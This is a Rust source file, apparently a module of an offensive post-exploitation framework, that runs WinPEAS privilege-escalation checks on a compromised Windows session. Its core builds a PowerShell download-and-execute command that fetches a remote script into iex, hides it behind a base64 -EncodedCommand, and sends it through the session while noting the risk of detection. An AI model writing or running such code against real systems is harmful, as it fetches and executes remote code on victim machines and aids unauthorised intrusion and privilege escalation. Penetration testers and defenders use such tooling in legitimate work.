// TODO: Create alternative using basic windows provided commands.
// TODO: Create module to download from custom server. (WIN, Linux)

use crate::core::modules::Module;
use crate::core::loghandler::LogHandler;
use crate::cli::output::send_command_and_print_output_until_marker;
use base64;

pub struct WinpeasWindows;

impl Module for WinpeasWindows {
    fn name(&self) -> &'static str { "windows/winpeas" }
    fn description(&self) -> &'static str { "Run WinPEAS for privilege escalation checks. This is very likely to be detected!" }
    fn usage(&self) -> &'static str { "Usage: run-module windows/winpeas <session_id>" }
    fn platform(&self) -> &'static str { "windows" }
    fn category(&self) -> &'static str { "privesc" }
    fn run(&self, session_id: usize, session_manager: &crate::core::session::SessionManager, _args: Vec<String>) {
        if let Some(session) = session_manager.get(session_id) {
            let marker = "__AEGIS_END__";
            let cmd = format!(
                "powershell -Command \"iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASbat/winPEAS.bat')\" ; echo {}\r\n",
                marker
            );
            // Encode as UTF-16LE
            let cmd_bytes: Vec<u8> = cmd.encode_utf16().flat_map(|c| c.to_le_bytes()).collect();
            let encoded = base64::encode(&cmd_bytes);
            let payload = format!("powershell -EncodedCommand {}\r\n", encoded);
            if let Err(e) = send_command_and_print_output_until_marker(&session, &payload, marker) {
                LogHandler::error(&format!("Failed to run WinPEAS: {}", e));
            } else {
                LogHandler::success("WinPEAS completed.");
            }
        }
    }
}